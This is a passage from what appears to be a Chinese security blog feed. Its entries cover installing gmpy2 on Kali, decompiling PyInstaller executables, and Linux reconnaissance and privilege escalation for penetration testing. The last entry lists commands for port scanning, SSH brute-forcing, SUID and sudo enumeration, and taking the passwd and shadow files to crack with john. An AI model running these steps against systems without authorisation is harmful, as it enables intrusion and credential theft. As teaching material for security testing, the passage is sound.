<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207153745779.png" alt="image-20211207153745779" /></p>
<h3 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaHV3b28ubmV0LzIwMjAvcG9zdC00MTQ5Lmh0bWw=">Windows DPAPI 数据加密保护接口详解</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kMmFmMDhlNmY4ZmI=">dns 域传送漏洞利用总结</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>kali 安装gmpy2报错问题总结</title>
    <url>/article/9f3a01f6.html</url>
    <content><![CDATA[<h2 id="1缺失依赖包问题"><a class="anchor" href="#1缺失依赖包问题">#</a> 1. 缺失依赖包问题</h2>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205131630193.png" alt="image-20211205131630193" /></p>
<p>原因是缺少了一些系统依赖，分别是： <code>gmp</code>   <code>mpfr</code>   <code>mpc</code> <br />
 安装以下依赖就可以完成安装 <code>gmpy2</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install libgmp<span class="token operator">-</span>dev</pre></td></tr><tr><td data-num="2"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install libmpfr<span class="token operator">-</span>dev</pre></td></tr><tr><td data-num="3"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install libmpc<span class="token operator">-</span>dev</pre></td></tr></table></figure><h2 id="2缺失python的头文件和静态库包问题"><a class="anchor" href="#2缺失python的头文件和静态库包问题">#</a> 2. 缺失 python 的头文件和静态库包问题</h2>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205132023479.png" alt="image-20211205132023479" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>sudo apt<span class="token operator">-</span><span class="token keyword">get</span> install python3<span class="token operator">-</span>dev</pre></td></tr></table></figure><h2 id="3下载中断问题"><a class="anchor" href="#3下载中断问题">#</a> 3. 下载中断问题</h2>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205132422798.png" alt="image-20211205132422798" /></p>
<p>尝试换源后，重新下载。</p>
<p>PS: 换源要注意备份！</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>vim <span class="token operator">/</span>etc<span class="token operator">/</span>apt<span class="token operator">/</span>sources<span class="token punctuation">.</span>list</pre></td></tr></table></figure><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>#阿里云</pre></td></tr><tr><td data-num="2"></td><td><pre>deb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib</pre></td></tr><tr><td data-num="3"></td><td><pre>deb<span class="token operator">-</span>src http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib</pre></td></tr><tr><td data-num="4"></td><td><pre>deb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>kali<span class="token operator">-</span>security kali<span class="token operator">-</span>rolling<span class="token operator">/</span>updates main contrib non<span class="token operator">-</span>free</pre></td></tr><tr><td data-num="5"></td><td><pre>#中科大</pre></td></tr><tr><td data-num="6"></td><td><pre>deb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>ustc<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib</pre></td></tr><tr><td data-num="7"></td><td><pre>deb<span class="token operator">-</span>src http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>ustc<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib</pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>pyc反编译那些事儿</title>
    <url>/article/f287aeaa.html</url>
    <content><![CDATA[<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211126213226747-173403618.jpg" alt="image" /></p>
<h2 id="内容介绍"><a class="anchor" href="#内容介绍">#</a> 内容介绍</h2>
<p>PyInstaller 封装程序的反编译：</p>
<ol>
<li>使用 PyInstaller Extractor 提取由 PyiIstaller 生成的可执行文件内容</li>
<li>使用 Uncompyle6 进行反编译</li>
</ol>
<h2 id="pyiistaller生成的可执行文件"><a class="anchor" href="#pyiistaller生成的可执行文件">#</a> PyiIstaller 生成的可执行文件</h2>
<p>如果要建立独立应用，那么需要把 python 的依赖包全部打包。<br />
安装：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>pip install pyinstaller</pre></td></tr></table></figure><p>打包：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>pyinstaller <span class="token operator">-</span>F <span class="token operator">-</span>w XXX<span class="token punctuation">.</span>py</pre></td></tr></table></figure><p>打包完成后，会建立两个文件夹，分别是 <code>build</code>  和 <code>dist</code> ，可执行文件就在 <code>dist</code>  下面，同时需要把程序用到的文件放到同一个目录（如果用的是相对路径的话）<br />
 <code>build</code>  下面有一个 <code>warn-UI.txt</code>  文件，如果打包完成后无法运行文件可以在此查看问题<br />
以下是 <code>pyinstaller</code>  的常用选项</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">-</span>h，<span class="token operator">--</span>help	查看该模块的帮助信息</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span><span class="token constant">F</span>，<span class="token operator">-</span>onefile	产生单个的可执行文件</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span>a，<span class="token operator">--</span>ascii	不包含 Unicode 字符集支持</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">-</span>d，<span class="token operator">--</span>debug	产生 debug 版本的可执行文件</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">-</span>w，<span class="token operator">--</span>windowed，<span class="token operator">--</span>noconsolc	指定程序运行时不显示命令行窗口（仅对 Windows 有效）</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">-</span>c，<span class="token operator">--</span>nowindowed，<span class="token operator">--</span>console	指定使用命令行窗口运行程序（仅对 Windows 有效）</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">-</span>o <span class="token constant">DIR</span>，<span class="token operator">--</span>out<span class="token operator">=</span><span class="token constant">DIR</span>	指定 spec 文件的生成目录。如果没有指定，则默认使用当前目录来生成 spec 文件</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">-</span>p <span class="token constant">DIR</span>，<span class="token operator">--</span>path<span class="token operator">=</span><span class="token constant">DIR</span>	设置 Python 导入模块的路径（和设置 <span class="token constant">PYTHONPATH</span> 环境变量的作用相似）。也可使用路径分隔符（Windows 使用分号，Linux 使用冒号）来分隔多个路径</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">-</span>n <span class="token constant">NAME</span>，<span class="token operator">--</span>name<span class="token operator">=</span><span class="token constant">NAME</span>	指定项目（产生的 spec）名字。如果省略该选项，那么第一个脚本的主文件名将作为 spec 的名字</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">-</span><span class="token constant">D</span>，<span class="token operator">--</span>onedir	产生一个目录（包含多个文件）作为可执行程序</pre></td></tr></table></figure><h2 id="使用pyinstxtractor提取-pyc-文件"><a class="anchor" href="#使用pyinstxtractor提取-pyc-文件">#</a> 使用 PyInstxtractor 提取 *.pyc 文件</h2>
<p><strong>工具准备：</strong><br />
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V4dHJlbWVjb2RlcnMtcmUvcHlpbnN0eHRyYWN0b3I=">PyInstaller Extractor 项目地址</span></p>
<p><strong>工作目录：</strong></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Mode                LastWriteTime         Length Name</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span>                <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>         <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">-</span>a<span class="token operator">--</span><span class="token operator">--</span>        <span class="token number">2020</span><span class="token operator">/</span><span class="token number">3</span><span class="token operator">/</span><span class="token number">24</span>     <span class="token number">15</span><span class="token operator">:</span><span class="token number">37</span>       <span class="token number">45937021</span> Main_cfg_editor<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">-</span>a<span class="token operator">--</span><span class="token operator">--</span>        <span class="token number">2020</span><span class="token operator">/</span><span class="token number">3</span><span class="token operator">/</span><span class="token number">25</span>     <span class="token number">14</span><span class="token operator">:</span><span class="token number">33</span>          <span class="token number">13194</span> pyinstxtractor<span class="token punctuation">.</span>py</pre></td></tr></table></figure><p><strong>提取文件：</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>python pyinstxtractor<span class="token punctuation">.</span>py Main_cfg_editor<span class="token punctuation">.</span>exe</pre></td></tr></table></figure><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Processing Main_cfg_editor<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Pyinstaller version<span class="token operator">:</span> <span class="token number">2.1</span><span class="token operator">+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Python version<span class="token operator">:</span> <span class="token number">37</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Length <span class="token keyword">of</span> <span class="token keyword">package</span><span class="token operator">:</span> <span class="token number">45659005</span> bytes</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found <span class="token number">2823</span> files <span class="token keyword">in</span> CArchive</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Beginning extraction<span class="token operator">...</span>please standby</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> pyiboot01_bootstrap<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> pyi_rth_pkgres<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> pyi_rth_win32comgenpy<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> pyi_rth_multiprocessing<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> pyi_rth_traitlets<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> pyi_rth__tkinter<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> Main_cfg_editor<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found <span class="token number">1627</span> files <span class="token keyword">in</span> <span class="token constant">PYZ</span> archive</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Successfully extracted pyinstaller archive<span class="token operator">:</span> Main_cfg_editor<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>You can now use a python decompiler on the pyc files within the extracted directory</pre></td></tr></table></figure><h2 id="使用uncompyle反编译-pyc-文件"><a class="anchor" href="#使用uncompyle反编译-pyc-文件">#</a> 使用 Uncompyle 反编译 *.pyc 文件</h2>
<p><strong>工作准备：</strong></p>
<p><code>Uncompyle6</code>  库的安装：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>pip install uncompyle6</pre></td></tr></table></figure><p>反编译：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>uncompyle6 Main_cfg_editor<span class="token punctuation">.</span>pyc <span class="token operator">></span> Main_cfg_editor<span class="token punctuation">.</span>py</pre></td></tr></table></figure><h2 id="常见错误信息"><a class="anchor" href="#常见错误信息">#</a> 常见错误信息</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Invalid pyc<span class="token operator">/</span>pyo file <span class="token operator">-</span> Magic value mismatch<span class="token operator">!</span></pre></td></tr></table></figure><p>原因：由于每个  <code>.pyc</code>  文件都有一个 <code>magic head</code> ， <code>PyInstaller</code>  生成  <code>.exe</code>  的时候会把 <code>.pyc</code>  的  <code>magic</code>  部分去掉，在反编译的时候需要补齐，高版本  <code>PyInstxtractor 2.0</code>  已经解决这个问题。</p>
<p>如果需要手动补齐  <code>magic head</code>  的情况下：</p>
<p>使用 16 进制模式查看主文件与主文件目录下的  <code>struct</code>  文件，需要在主文件头插入 <code>16</code>  个字节与  <code>struct</code>  文件保持一致（其中前 <code>4</code>  个字节是 <code>Python</code>  编译版本，要完全一致）<br />
注意模板文件仅需要插入 <code>8</code>  个字节，与  <code>struct</code>  文件保持一致</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">ValueError</span><span class="token operator">:</span> source code string cannot contain <span class="token keyword">null</span> bytes</pre></td></tr></table></figure><p>通常在反编译后执行  <code>.py</code>  文件时发生，原因时反编译后的文件中存在一些空字符。最简单的解决办法是把文本复制到其他文本编辑器（例如 <code>UltraEdit</code> ），然后复制回来。</p>
<p><strong>如使用 python 3.9 报错</strong></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">Error</span><span class="token operator">:</span> uncompyle6 requires Python <span class="token number">2.6</span><span class="token operator">-</span><span class="token number">3.8</span></pre></td></tr></table></figure><p>我们只需要给 <code>uncompile</code>  包加一个 3.9 支持</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211117200509607-1978387793.png" alt="image" /></p>
<p><strong>.pyc 文件首部损坏</strong></p>
<p><code>struct.pyc</code>  文件包含一个完整可用的首部，可以用来修复 <code>.pyc</code>  文件.</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2474919-20210919203104861-170616122.png" alt="image" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下信息搜集及msf工具用法</title>
    <url>/article/fad2c18a.html</url>
    <content><![CDATA[<h3 id="00x01linux下的信息收集"><a class="anchor" href="#00x01linux下的信息收集">#</a> 00x01.Linux 下的信息收集</h3>
<p><code>linux</code>  下多以端口扫描、 <code>IP</code>  扫描、 <code>MAC</code>  扫描等为主的手段进行信息搜集</p>
<h4 id="nmap之前期的信息收集"><a class="anchor" href="#nmap之前期的信息收集">#</a> NMAP 之前期的信息收集</h4>
<p><code>nmap</code>  作为渗透测试最常用的工具之一会出现在各种场景中，其功能也非常丰富，不仅可以扫描端口也可以探测指定网段存活主机。</p>
<p>扫描主机端口：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span><span class="token constant">T5</span> <span class="token operator">-</span><span class="token constant">A</span> <span class="token operator">-</span>v <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">&lt;</span>target ip<span class="token operator">></span></pre></td></tr></table></figure><p>扫描一个 IP 段，探测存活主机：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>sP <span class="token operator">&lt;</span>network address<span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">CIDR</span><span class="token operator">></span></pre></td></tr></table></figure><p>探测操作系统类型：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span><span class="token number">0</span> <span class="token operator">&lt;</span>target <span class="token constant">IP</span><span class="token operator">></span></pre></td></tr></table></figure><p>甚至指定相应脚本还可以扫描漏洞和爆破弱口令，如下：</p>
<p>寻找登录授权页面：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>p <span class="token number">80</span> <span class="token operator">--</span>script http<span class="token operator">-</span>auth<span class="token operator">-</span>finder <span class="token operator">&lt;</span>www<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>com<span class="token operator">></span></pre></td></tr></table></figure><p><code>SSH</code>  爆破：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>p22 <span class="token operator">--</span>script ssh<span class="token operator">-</span>brute <span class="token operator">&lt;</span>target ip<span class="token operator">></span></pre></td></tr></table></figure><p><code>dns</code>  域传送漏洞：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>p <span class="token number">53</span> <span class="token operator">--</span>script dns<span class="token operator">-</span>zone<span class="token operator">-</span>transfer<span class="token punctuation">.</span>nse <span class="token operator">-</span>v <span class="token operator">&lt;</span>target ip<span class="token operator">></span></pre></td></tr></table></figure><p>除了 <code>nmap</code>  工具以外，在需要扫描大量主机端口的情况下， <code>masscan</code>  是一个非常推荐的手段：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Masscan <span class="token number">127.0</span>.0.0/24 -p443  <span class="token comment"># 单端口扫描</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Masscan <span class="token number">127.0</span>.0.0/24 --top-ports <span class="token number">100</span> -rate <span class="token number">100000</span>  <span class="token comment"># 快速扫描</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Masscan <span class="token number">127.0</span>.0.0/24 --top-ports <span class="token number">100</span> --excludefile exclude.txt <span class="token comment"># 排除指定目标</span></pre></td></tr><tr><td data-num="4"></td><td><pre>masscan <span class="token number">127.0</span>.0.0/24 -p20,21,22,23,80,161,443,873,2181,3389,6379,7001,8000,8009,8080,9000,9009,9090,9200,9300,10000,50070 <span class="token operator">></span> results.txt</pre></td></tr></table></figure><p>当然，这些远远不足以让攻击方拿下一台机器，这只是作为黑盒情况下的 <code>Linux</code>  主机信息收集的方式。</p>
<h4 id="中期的信息收集"><a class="anchor" href="#中期的信息收集">#</a> 中期的信息收集</h4>
<p>在运维人员能保证系统和软件维持在新版本、无弱口令、无特殊 <code>SUID</code>  文件、 <code>sudo</code>  命令的情况下， <code>Linux</code>  提权是基本不可能的，但是安全很难做到万无一失。</p>
<p>在各种环境中存在各种不同版本的 <code>Linux</code>  系统，甚至类 <code>UNIX</code>  系统，比如: <code>OpenSUSE</code> 、 <code>Fedora</code> 、 <code>Oracle Linxu</code> 、 <code>Slackware</code> 、 <code>FreeBSD</code> 、 <code>OpenBSD</code>  等等，所以先摸清系统版本信息是关键。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>hostname                    # 查看服务器主机名命令</pre></td></tr><tr><td data-num="2"></td><td><pre>uname <span class="token operator">-</span>a</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128171121602.png" alt="image-20211128172549492" /></p>
<p>查看内核信息：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>uname <span class="token operator">-</span>mrs</pre></td></tr><tr><td data-num="2"></td><td><pre>rpm <span class="token operator">-</span>q <span class="token operator">&lt;</span>软件包名称<span class="token operator">></span></pre></td></tr><tr><td data-num="3"></td><td><pre>dmesg <span class="token operator">|</span> grep Linux</pre></td></tr><tr><td data-num="4"></td><td><pre>ls <span class="token operator">/</span>boot <span class="token operator">|</span> grep vmlinuz<span class="token operator">-</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128171619072.png" alt="image-20211128172623959" /></p>
<p>明白了系统的版本或发行版，下一步就针对这个搜索有关的提权漏洞，这里以  <code>ubuntu20.04</code>  为例，使用  <code>Exploit-DB</code>  的命令行搜索工具  <code>searchsploit</code></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>searchsploit <span class="token operator">-</span>w ubuntu <span class="token number">20.04</span> <span class="token number">4.4</span><span class="token punctuation">.</span>x</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128172642929.png" alt="image-20211128172642929" /></p>
<p>若是不存在提权漏洞的版本，那么注意点就要放到用户的信息上了。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>id                          # 显示真实有效的用户 <span class="token constant">ID</span><span class="token punctuation">(</span><span class="token constant">UID</span><span class="token punctuation">)</span>和组 <span class="token constant">ID</span><span class="token punctuation">(</span><span class="token constant">GID</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>whoami                      # 当前用户</pre></td></tr><tr><td data-num="3"></td><td><pre>groups                      # 当前组</pre></td></tr><tr><td data-num="4"></td><td><pre>who                         # 显示目前登录系统的用户信息</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128172901783.png" alt="image-20211128172901783" /></p>
<p>比如 SUID 文件和 sudo 权限</p>
<p>找带 suid 的文件</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>u<span class="token operator">=</span>s <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128173034957.png" alt="image-20211128173034957" /></p>
<p>查看当前用户执行哪些 sudo 命令无需密码</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>sudo <span class="token operator">-</span>l</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128173101546.png" alt="image-20211128173101546" /></p>
<p>找到了可以 sudo 执行的文件又怎么提权呢？这里推荐一个网站 <span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v">https://gtfobins.github.io/</span> 其中记录了大量的提权方案。</p>
<h4 id="后期的信息收集"><a class="anchor" href="#后期的信息收集">#</a> 后期的信息收集</h4>
<p>到了后期阶段，当攻击者成功提权，信息收集的目的其实偏向于扩大战果，而不是寻找突破口，红方人员会详尽一且办法，挖掘机器上有用的信息，然后作为跳板横向进攻。</p>
<p>知晓机器上运行着什么进程可以推测机器的定位</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">ps</span> -aux                     <span class="token comment"># 列出所有进程以及相关信息命令</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">ps</span> -ef</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">top</span>                         <span class="token comment"># 总览系统全面信息命令，Ctrl + C 退出界面</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128175139989.png" alt="image-20211128175139989" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128175201332.png" alt="image-20211128175201332" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211128175216956.png" alt="image-20211128175216956" /></p>
<p>安装了哪些程序？什么版本？是否正在运行？</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>ls <span class="token operator">-</span>alh <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span></pre></td></tr><tr><td data-num="2"></td><td><pre>ls <span class="token operator">-</span>alh <span class="token operator">/</span>sbin<span class="token operator">/</span></pre></td></tr><tr><td data-num="3"></td><td><pre>dpkg <span class="token operator">-</span>l</pre></td></tr><tr><td data-num="4"></td><td><pre>rpm <span class="token operator">-</span>qa</pre></td></tr><tr><td data-num="5"></td><td><pre>ls <span class="token operator">-</span>alh <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>cache<span class="token operator">/</span>apt<span class="token operator">/</span>archivesO</pre></td></tr><tr><td data-num="6"></td><td><pre>ls <span class="token operator">-</span>alh <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>cache<span class="token operator">/</span>yum<span class="token operator">/</span></pre></td></tr></table></figure><p>在查看一些常见的服务配置文件</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>syslog<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="2"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>chttp<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="3"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>lighttpd<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="4"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>cups<span class="token operator">/</span>cupsd<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="5"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>inetd<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="6"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>apache2<span class="token operator">/</span>apache2<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="7"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>my<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="8"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="9"></td><td><pre>cat <span class="token operator">/</span>opt<span class="token operator">/</span>lampp<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="10"></td><td><pre>ls <span class="token operator">-</span>aRl <span class="token operator">/</span>etc<span class="token operator">/</span> <span class="token operator">|</span> awk '$1 <span class="token operator">~</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^.*r.*</span><span class="token regex-delimiter">/</span></span></pre></td></tr></table></figure><p>如果时间充足，看一看日志文件也是很好的选择，这里就不多阐述，在之后的蓝队篇中会介绍。作为最高权限用户， <code>shadow</code>  文件不可不看，万一跑出几个密码，横向渗透的成功率就会大大提高，将 <code>passwd</code>  和 <code>shadow</code>  文件下载到 <code>kali</code>  中进行 <code>unshadow</code> ，随后 <code>john</code>  爆破 <code>hash</code></p>
